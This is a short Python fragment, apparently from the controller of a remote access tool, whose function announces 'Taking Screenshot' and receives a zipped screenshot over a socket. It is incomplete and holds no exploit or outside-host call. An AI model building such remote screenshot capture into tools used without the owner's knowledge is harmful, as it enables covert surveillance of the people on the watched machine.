import pyautogui
import os

def capture_screenshot(my_socket):
    print("[+] Taking Screenshot")

    zipped_name = "screenshot.zip"

    my_socket.receive_zipped(zipped_name)